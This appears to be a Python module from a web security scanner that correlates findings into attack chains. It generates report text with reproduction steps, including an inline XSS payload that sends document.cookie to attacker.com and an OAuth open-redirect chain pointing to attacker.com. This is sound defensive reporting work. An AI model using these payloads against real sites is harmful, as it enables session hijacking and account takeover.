"""
Super Monster v2 - Smart Correlator

Correlates VERIFIED findings into attack chains that represent
real exploitable paths. STRICT rules - only chains findings that
together create a meaningful attack scenario.

VALID chains: findings that together enable a real attack
INVALID chains: two informational findings, same finding on multiple domains
"""

from dataclasses import dataclass, field
from typing import List, Optional

from .smart_scanner import Finding
from .config import SEVERITY_ORDER
from .domain_classifier import DomainClassifier


@dataclass
class Chain:
    """A correlation chain representing a real attack path."""

    title: str = ""
    description: str = ""
    findings: list = field(default_factory=list)
    impact: str = ""
    confidence: float = 0.0
    severity: str = ""
    exploitability: str = ""  # "confirmed", "likely", "theoretical"
    domains: list = field(default_factory=list)
    reproduction_steps: list = field(default_factory=list)


class SmartCorrelator:
    """
    Correlates verified findings into attack chains.

    ONLY creates chains from findings that together represent a real
    exploitable path. Does NOT chain noise like 'missing header A +
    missing header B'. Does NOT consider same finding type on multiple
    domains as a chain.

    Rules:
    1. CORS reflection + credentials on payment/auth = Cross-origin data theft
    2. Cookie without Secure flag on auth + no HSTS on same domain = Session theft via MITM
    3. CSP unsafe-inline on payment + cookie insecure on same domain = XSS-to-session-theft
    4. API exposed without auth + sensitive data visible = Data leak
    5. Subdomain takeover + cookie scope includes parent domain = Account takeover
    6. Open redirect on auth domain + no CSRF protection = OAuth token theft
    7. Server version disclosed + known CVE patterns = Known vulnerability exploitation
    """

    # Domain types considered sensitive for chain escalation
    SENSITIVE_DOMAIN_TYPES = ("payment", "auth", "api", "admin")

    # Finding types that are informational-only (never chain two of these)
    INFORMATIONAL_TYPES = ("server_disclosure",)

    def __init__(self):
        """Initialize correlator with a DomainClassifier instance."""
        self._classifier = DomainClassifier()

    def correlate(self, verified_findings: List[Finding]) -> List[Chain]:
        """
        Correlate verified findings into attack chains.

        Only creates chains with confidence > 0.8. Groups findings by
        domain first, then checks each valid chain rule.

        Args:
            verified_findings: List of Finding objects that passed verification.

        Returns:
            List of Chain objects representing real attack paths.
        """
        if not verified_findings:
            return []

        chains = []

        # Group findings by domain
        domain_groups = self._group_by_domain(verified_findings)

        # Check per-domain chain rules
        for domain, findings in domain_groups.items():
            # Rule 1: CORS + credentials = Cross-origin data theft
            chain = self._check_cors_data_theft(findings)
            if chain and chain.confidence > 0.8:
                chains.append(chain)

            # Rule 2: Cookie insecure + no HSTS = Session theft via MITM
            chain = self._check_session_theft_mitm(findings)
            if chain and chain.confidence > 0.8:
                chains.append(chain)

            # Rule 3: CSP unsafe-inline + cookie insecure = XSS-to-session-theft
            chain = self._check_xss_session_chain(findings)
            if chain and chain.confidence > 0.8:
                chains.append(chain)

            # Rule 4: API exposed + sensitive data = Data leak
            chain = self._check_api_data_leak(findings)
            if chain and chain.confidence > 0.8:
                chains.append(chain)

            # Rule 6: Open redirect + auth domain = OAuth token theft
            chain = self._check_redirect_token_theft(findings)
            if chain and chain.confidence > 0.8:
                chains.append(chain)

        # Rule 5: Subdomain takeover + cookie scope (cross-domain check)
        takeover_chains = self._check_subdomain_account_takeover(verified_findings)
        for chain in takeover_chains:
            if chain.confidence > 0.8:
                chains.append(chain)

        # Rule 7: Server version + known CVE patterns
        for domain, findings in domain_groups.items():
            chain = self._check_version_cve_chain(findings)
            if chain and chain.confidence > 0.8:
                chains.append(chain)

        # Sort chains by severity
        chains.sort(key=lambda c: SEVERITY_ORDER.get(c.severity, 4))

        return chains

    def _group_by_domain(self, findings: List[Finding]) -> dict:
        """Group findings by their domain."""
        groups = {}
        for finding in findings:
            domain = finding.domain
            if domain not in groups:
                groups[domain] = []
            groups[domain].append(finding)
        return groups

    def _get_domain_type(self, domain: str) -> str:
        """
        Determine domain type from the domain name.

        Delegates to DomainClassifier to ensure consistent classification
        rules across the entire codebase.
        """
        return self._classifier.classify_domain(domain)

    def _check_cors_data_theft(self, domain_findings: List[Finding]) -> Optional[Chain]:
        """
        Rule 1: CORS reflection on payment/auth domain with credentials allowed.

        Creates chain: Cross-origin data theft (CRITICAL)

        Requirements:
        - CORS finding with origin reflection (not wildcard)
        - Domain is payment or auth type
        - Credentials allowed (Access-Control-Allow-Credentials: true)
        """
        cors_findings = [
            f for f in domain_findings if f.finding_type == "cors"
        ]

        if not cors_findings:
            return None

        for cors_finding in cors_findings:
            domain_type = self._get_domain_type(cors_finding.domain)

            # Must be on a sensitive domain
            if domain_type not in ("payment", "auth", "api"):
                continue

            # Check if credentials are allowed (evidence contains this info)
            has_credentials = "credentials" in cors_finding.evidence.lower()

            if not has_credentials:
                continue

            # This is a real attack chain
            chain_findings = [cors_finding]
            confidence = self._calculate_chain_confidence(chain_findings)

            # Escalate confidence because CORS + credentials is directly exploitable
            confidence = min(confidence + 0.05, 1.0)

            return Chain(
                title=f"Cross-Origin Data Theft on {cors_finding.domain}",
                description=(
                    f"CORS misconfiguration with credential reflection on "
                    f"{domain_type} domain {cors_finding.domain}. An attacker "
                    f"can read authenticated responses cross-origin, stealing "
                    f"user data including payment info and session tokens."
                ),
                findings=chain_findings,
                impact=(
                    "Attacker can create a malicious page that reads "
                    "authenticated API responses from the victim's browser, "
                    "exfiltrating personal data, payment details, or session tokens."
                ),
                confidence=confidence,
                severity="critical",
                exploitability="confirmed",
                domains=[cors_finding.domain],
                reproduction_steps=[
                    "1. Create a malicious HTML page with JavaScript",
                    f"2. Use fetch('{cors_finding.url}', {{credentials: 'include'}})",
                    "3. Read the response (CORS allows it due to origin reflection)",
                    "4. Exfiltrate the authenticated data to attacker server",
                    "5. Victim visits attacker page while logged in to target",
                ],
            )

        return None

    def _check_session_theft_mitm(self, domain_findings: List[Finding]) -> Optional[Chain]:
        """
        Rule 2: Cookie without Secure flag + no HSTS on same domain.

        Creates chain: Session theft via MITM (HIGH)

        Requirements:
        - Cookie finding with missing Secure flag on auth/payment domain
        - HSTS finding (missing) on same domain
        - Both must be verified
        """
        cookie_findings = [
            f for f in domain_findings if f.finding_type == "cookie_security"
        ]
        hsts_findings = [
            f for f in domain_findings if f.finding_type == "hsts"
        ]

        if not cookie_findings or not hsts_findings:
            return None

        for cookie_finding in cookie_findings:
            domain_type = self._get_domain_type(cookie_finding.domain)

            # Must be on auth or payment domain
            if domain_type not in ("auth", "payment"):
                continue

            # Check that cookie is missing Secure flag specifically
            if "secure" not in cookie_finding.evidence.lower():
                continue

            # Find matching HSTS finding for same domain
            matching_hsts = None
            for hsts_finding in hsts_findings:
                if hsts_finding.domain == cookie_finding.domain:
                    matching_hsts = hsts_finding
                    break

            if not matching_hsts:
                continue

            chain_findings = [cookie_finding, matching_hsts]
            confidence = self._calculate_chain_confidence(chain_findings)

            return Chain(
                title=f"Session Theft via MITM on {cookie_finding.domain}",
                description=(
                    f"Session cookie without Secure flag combined with "
                    f"missing HSTS on {domain_type} domain "
                    f"{cookie_finding.domain}. An attacker on the same "
                    f"network can intercept the session cookie via HTTP "
                    f"downgrade attack."
                ),
                findings=chain_findings,
                impact=(
                    "Attacker on same network (WiFi, ISP level) can "
                    "downgrade connection to HTTP and steal session cookie, "
                    "gaining full access to victim's account."
                ),
                confidence=confidence,
                severity="high",
                exploitability="likely",
                domains=[cookie_finding.domain],
                reproduction_steps=[
                    "1. Position on same network as victim (e.g., public WiFi)",
                    "2. ARP spoof or DNS hijack to become MITM",
                    f"3. Redirect victim's HTTP request to http://{cookie_finding.domain}/",
                    "4. No HSTS means browser allows HTTP connection",
                    "5. Session cookie sent without Secure flag over HTTP",
                    "6. Capture session cookie from unencrypted traffic",
                    "7. Use stolen cookie to access victim's account",
                ],
            )

        return None

    def _check_xss_session_chain(self, domain_findings: List[Finding]) -> Optional[Chain]:
        """
        Rule 3: CSP unsafe-inline on payment domain + cookie insecure on same domain.

        Creates chain: XSS-to-session-theft potential (HIGH)

        Requirements:
        - CSP finding with unsafe-inline on payment/auth domain
        - Cookie finding (missing HttpOnly) on same domain
        """
        csp_findings = [
            f for f in domain_findings if f.finding_type == "csp"
        ]
        cookie_findings = [
            f for f in domain_findings if f.finding_type == "cookie_security"
        ]

        if not csp_findings or not cookie_findings:
            return None

        for csp_finding in csp_findings:
            domain_type = self._get_domain_type(csp_finding.domain)

            # Must be on sensitive domain
            if domain_type not in ("payment", "auth"):
                continue

            # CSP must have unsafe-inline
            if "unsafe-inline" not in csp_finding.evidence.lower():
                continue

            # Find matching cookie finding
            matching_cookie = None
            for cookie_finding in cookie_findings:
                if cookie_finding.domain == csp_finding.domain:
                    # Cookie should be missing HttpOnly
                    if "httponly" in cookie_finding.evidence.lower():
                        matching_cookie = cookie_finding
                        break

            if not matching_cookie:
                continue

            chain_findings = [csp_finding, matching_cookie]
            confidence = self._calculate_chain_confidence(chain_findings)

            return Chain(
                title=f"XSS-to-Session-Theft on {csp_finding.domain}",
                description=(
                    f"CSP allows unsafe-inline scripts and session cookies "
                    f"lack HttpOnly flag on {domain_type} domain "
                    f"{csp_finding.domain}. If XSS is found, attacker can "
                    f"directly steal session cookies via JavaScript."
                ),
                findings=chain_findings,
                impact=(
                    "Any XSS vulnerability on this domain can directly "
                    "steal session tokens because: 1) CSP does not block "
                    "inline scripts, 2) Cookies are accessible to JavaScript. "
                    "This lowers the bar for session hijacking."
                ),
                confidence=confidence,
                severity="high",
                exploitability="theoretical",
                domains=[csp_finding.domain],
                reproduction_steps=[
                    f"1. Find XSS input on {csp_finding.domain} (reflected or stored)",
                    "2. CSP unsafe-inline allows inline script execution",
                    "3. Inject: <script>fetch('https://attacker.com/?c='+document.cookie)</script>",
                    "4. Cookie lacks HttpOnly, so document.cookie returns session token",
                    "5. Attacker receives victim's session cookie",
                ],
            )

        return None

    def _check_api_data_leak(self, domain_findings: List[Finding]) -> Optional[Chain]:
        """
        Rule 4: API exposed without auth (swagger/graphql) + sensitive data visible.

        Creates chain: Data leak (CRITICAL)

        Requirements:
        - API exposure finding (swagger, graphql introspection)
        - Domain is api/admin type OR evidence shows sensitive data
        - High confidence that real API data is exposed
        """
        api_findings = [
            f for f in domain_findings
            if f.finding_type in ("api_exposure", "graphql")
        ]

        if not api_findings:
            return None

        for api_finding in api_findings:
            domain_type = self._get_domain_type(api_finding.domain)

            # Must be on a meaningful domain (not CDN)
            if domain_type == "cdn":
                continue

            # Check confidence is high (real API docs, not error pages)
            if api_finding.confidence < 0.8:
                continue

            # For GraphQL, introspection is itself a significant data leak
            is_graphql = api_finding.finding_type == "graphql"

            # For Swagger/API docs on admin/payment, it's critical
            is_sensitive_api = domain_type in ("admin", "payment", "auth")

            if not is_graphql and not is_sensitive_api:
                continue

            chain_findings = [api_finding]
            confidence = self._calculate_chain_confidence(chain_findings)

            # Escalate for GraphQL introspection or sensitive domains
            if is_graphql and is_sensitive_api:
                confidence = min(confidence + 0.1, 1.0)
                severity = "critical"
            elif is_sensitive_api:
                severity = "critical"
            else:
                severity = "high"

            return Chain(
                title=f"API Data Leak on {api_finding.domain}",
                description=(
                    f"{'GraphQL introspection' if is_graphql else 'API documentation'} "
                    f"exposed on {domain_type} domain {api_finding.domain}. "
                    f"The full API schema and endpoints are publicly "
                    f"accessible without authentication."
                ),
                findings=chain_findings,
                impact=(
                    "Exposed API documentation/schema reveals internal "
                    "endpoints, data models, authentication flows, and "
                    "potential attack vectors. Attacker can enumerate "
                    "all available operations and craft targeted attacks."
                ),
                confidence=confidence,
                severity=severity,
                exploitability="confirmed" if is_graphql else "likely",
                domains=[api_finding.domain],
                reproduction_steps=[
                    f"1. Navigate to {api_finding.url}",
                    "2. Full API schema/documentation is accessible",
                    "3. No authentication required to view endpoints",
                    "4. Enumerate sensitive endpoints (user data, payments, admin)",
                    "5. Test endpoints for missing authentication",
                ],
            )

        return None

    def _check_subdomain_account_takeover(
        self, all_findings: List[Finding]
    ) -> List[Chain]:
        """
        Rule 5: Subdomain takeover possible + cookie scope includes parent domain.

        Creates chain: Account takeover (CRITICAL)

        This is a cross-domain check - looks at subdomain takeover findings
        and correlates with cookie findings on related domains.

        Requirements:
        - Subdomain takeover finding on any domain
        - Cookie finding on parent domain or sibling domain
          where cookie scope (Domain=) covers the takeover target
        """
        chains = []

        takeover_findings = [
            f for f in all_findings if f.finding_type == "subdomain_takeover"
        ]

        cookie_findings = [
            f for f in all_findings if f.finding_type == "cookie_security"
        ]

        if not takeover_findings:
            return chains

        for takeover_finding in takeover_findings:
            takeover_domain = takeover_finding.domain

            # Extract parent domain (e.g., from "test.example.com" get "example.com")
            parts = takeover_domain.split(".")
            if len(parts) < 2:
                continue
            parent_domain = ".".join(parts[-2:])

            # Check if any cookie finding is on a related domain
            # (same parent domain) where cookies might scope to parent
            related_cookie = None
            for cookie_finding in cookie_findings:
                cookie_parts = cookie_finding.domain.split(".")
                cookie_parent = ".".join(cookie_parts[-2:])

                if cookie_parent == parent_domain:
                    related_cookie = cookie_finding
                    break

            if not related_cookie:
                # Even without a cookie finding, subdomain takeover on
                # auth/payment domain is critical by itself
                domain_type = self._get_domain_type(takeover_domain)
                if domain_type in ("auth", "payment"):
                    chain_findings = [takeover_finding]
                    confidence = self._calculate_chain_confidence(chain_findings)

                    if confidence > 0.8:
                        chains.append(Chain(
                            title=f"Subdomain Takeover on {domain_type} domain",
                            description=(
                                f"Subdomain {takeover_domain} is vulnerable to "
                                f"takeover. As a {domain_type} domain, this could "
                                f"enable phishing or credential theft."
                            ),
                            findings=chain_findings,
                            impact=(
                                "Attacker can claim this subdomain and serve "
                                "content under the target's domain, enabling "
                                "credential phishing that appears legitimate."
                            ),
                            confidence=confidence,
                            severity="critical",
                            exploitability="confirmed",
                            domains=[takeover_domain],
                            reproduction_steps=[
                                f"1. Verify CNAME for {takeover_domain} points to unclaimed resource",
                                "2. Claim the resource on the hosting provider",
                                "3. Serve content under the target's domain",
                                "4. Use for phishing or cookie theft",
                            ],
                        ))
                continue

            # Have both takeover and cookie - this is account takeover chain
            chain_findings = [takeover_finding, related_cookie]
            confidence = self._calculate_chain_confidence(chain_findings)

            # Escalate because this combination is directly exploitable
            confidence = min(confidence + 0.05, 1.0)

            if confidence > 0.8:
                chains.append(Chain(
                    title=(
                        f"Account Takeover via Subdomain Takeover "
                        f"({takeover_domain})"
                    ),
                    description=(
                        f"Subdomain {takeover_domain} is vulnerable to "
                        f"takeover, and cookies on {related_cookie.domain} "
                        f"scope to the parent domain {parent_domain}. An "
                        f"attacker who takes over the subdomain can steal "
                        f"session cookies scoped to the parent domain."
                    ),
                    findings=chain_findings,
                    impact=(
                        "Attacker claims the dangling subdomain, serves "
                        "malicious content that reads cookies scoped to "
                        "the parent domain, achieving session hijacking "
                        "and full account takeover."
                    ),
                    confidence=confidence,
                    severity="critical",
                    exploitability="confirmed",
                    domains=[takeover_domain, related_cookie.domain],
                    reproduction_steps=[
                        f"1. Verify CNAME for {takeover_domain} points to unclaimed resource",
                        "2. Claim the resource on the hosting provider",
                        f"3. Serve page that reads document.cookie (scoped to .{parent_domain})",
                        "4. Victim visits the taken-over subdomain",
                        "5. JavaScript reads session cookies and sends to attacker",
                        "6. Attacker uses stolen cookie to access victim's account",
                    ],
                ))

        return chains

    def _check_redirect_token_theft(
        self, domain_findings: List[Finding]
    ) -> Optional[Chain]:
        """
        Rule 6: Open redirect on auth domain + no CSRF protection.

        Creates chain: OAuth token theft potential (HIGH)

        Requirements:
        - Open redirect finding on auth domain
        - Domain type is auth (handles OAuth/login flows)
        """
        redirect_findings = [
            f for f in domain_findings if f.finding_type == "open_redirect"
        ]

        if not redirect_findings:
            return None

        for redirect_finding in redirect_findings:
            domain_type = self._get_domain_type(redirect_finding.domain)

            # Open redirect is only significant on auth domains
            # (where OAuth/login redirects happen)
            if domain_type != "auth":
                continue

            chain_findings = [redirect_finding]
            confidence = self._calculate_chain_confidence(chain_findings)

            # Auth domain open redirects are especially dangerous
            confidence = min(confidence + 0.05, 1.0)

            return Chain(
                title=f"OAuth Token Theft via Open Redirect on {redirect_finding.domain}",
                description=(
                    f"Open redirect on authentication domain "
                    f"{redirect_finding.domain}. This can be abused to "
                    f"steal OAuth tokens or authorization codes by "
                    f"redirecting the callback to an attacker-controlled URL."
                ),
                findings=chain_findings,
                impact=(
                    "Attacker can modify OAuth redirect_uri to point to "
                    "attacker server via the open redirect. When victim "
                    "authenticates, the authorization code or token is "
                    "sent to the attacker, enabling account takeover."
                ),
                confidence=confidence,
                severity="high",
                exploitability="likely",
                domains=[redirect_finding.domain],
                reproduction_steps=[
                    f"1. Identify OAuth flow on {redirect_finding.domain}",
                    "2. Modify redirect_uri parameter to use the open redirect",
                    f"3. Chain: redirect_uri=https://{redirect_finding.domain}/?redirect=https://attacker.com",
                    "4. Victim clicks crafted OAuth link",
                    "5. After authentication, token/code redirects to attacker",
                    "6. Attacker uses stolen token to access victim's account",
                ],
            )

        return None

    def _check_version_cve_chain(
        self, domain_findings: List[Finding]
    ) -> Optional[Chain]:
        """
        Rule 7: Server version disclosed + known CVE for that version.

        Creates chain: Known vulnerability exploitation (HIGH)

        Requirements:
        - Server disclosure finding with specific version
        - Version matches known vulnerable ranges
        - Domain is sensitive type (not CDN/static)
        """
        version_findings = [
            f for f in domain_findings if f.finding_type == "server_disclosure"
        ]

        if not version_findings:
            return None

        # Known vulnerable version patterns
        # Format: (software_pattern, version_check, cve_reference)
        known_vulns = [
            ("nginx/1.1", "CVE-2021-23017", "DNS resolver vulnerability"),
            ("nginx/1.20", "CVE-2021-23017", "DNS resolver vulnerability"),
            ("apache/2.4.49", "CVE-2021-41773", "Path traversal"),
            ("apache/2.4.50", "CVE-2021-42013", "Path traversal bypass"),
            ("openssl/1.0", "CVE-2014-0160", "Heartbleed"),
            ("php/7.4", "CVE-2022-31625", "Buffer overflow in pg_query_params"),
            ("php/8.0", "CVE-2022-31626", "Buffer overflow in mysqlnd"),
            ("tomcat/9.0.0", "CVE-2020-1938", "Ghostcat AJP vulnerability"),
            ("iis/10.0", "CVE-2021-31166", "HTTP Protocol Stack RCE"),
        ]

        for version_finding in version_findings:
            domain_type = self._get_domain_type(version_finding.domain)

            # Not interesting on CDN/static
            if domain_type == "cdn":
                continue

            evidence_lower = version_finding.evidence.lower()

            # Check against known vulnerable versions
            for vuln_pattern, cve_id, vuln_desc in known_vulns:
                if vuln_pattern.lower() in evidence_lower:
                    chain_findings = [version_finding]
                    confidence = self._calculate_chain_confidence(chain_findings)

                    # Version match gives moderate confidence
                    # (version alone does not confirm exploitability)
                    confidence = min(confidence * 0.9, 0.92)

                    if confidence <= 0.8:
                        continue

                    return Chain(
                        title=(
                            f"Known Vulnerability ({cve_id}) on "
                            f"{version_finding.domain}"
                        ),
                        description=(
                            f"Server version disclosed ({version_finding.evidence}) "
                            f"matches known vulnerable version. {cve_id}: "
                            f"{vuln_desc}."
                        ),
                        findings=chain_findings,
                        impact=(
                            f"Server is running a version with known "
                            f"vulnerability {cve_id} ({vuln_desc}). "
                            f"Public exploits may be available."
                        ),
                        confidence=confidence,
                        severity="high",
                        exploitability="theoretical",
                        domains=[version_finding.domain],
                        reproduction_steps=[
                            f"1. Confirmed server version: {version_finding.evidence}",
                            f"2. Known CVE: {cve_id} - {vuln_desc}",
                            "3. Search for public exploit code",
                            "4. Verify exploit conditions are met",
                            "5. Report with version evidence",
                        ],
                    )

        return None

    def _calculate_chain_confidence(self, findings: List[Finding]) -> float:
        """
        Calculate confidence score for a chain based on constituent findings.

        Uses the minimum confidence among findings (chain is only as strong
        as its weakest link), with a small bonus for multiple confirmed findings.

        Args:
            findings: List of Finding objects in the chain.

        Returns:
            Confidence score between 0.0 and 1.0.
        """
        if not findings:
            return 0.0

        # Base confidence is the minimum among all findings
        confidences = [f.confidence for f in findings]
        min_confidence = min(confidences)

        # Small bonus for multiple confirmed findings (max 0.05 bonus)
        if len(findings) > 1:
            avg_confidence = sum(confidences) / len(confidences)
            bonus = min(0.05, (avg_confidence - min_confidence) * 0.5)
            min_confidence += bonus

        return min(min_confidence, 1.0)

    def _calculate_chain_severity(self, findings: List[Finding]) -> str:
        """
        Calculate severity for a chain.

        Returns the highest severity among findings. Chain context
        may escalate (e.g., two HIGH findings that together create
        a CRITICAL path), but two LOW findings never become MEDIUM.

        Args:
            findings: List of Finding objects in the chain.

        Returns:
            Severity string ("critical", "high", "medium", "low", "info").
        """
        if not findings:
            return "info"

        # Get highest severity (lowest SEVERITY_ORDER value)
        best_severity = "info"
        best_order = SEVERITY_ORDER.get("info", 4)

        for finding in findings:
            finding_order = SEVERITY_ORDER.get(finding.severity, 4)
            if finding_order < best_order:
                best_order = finding_order
                best_severity = finding.severity

        return best_severity
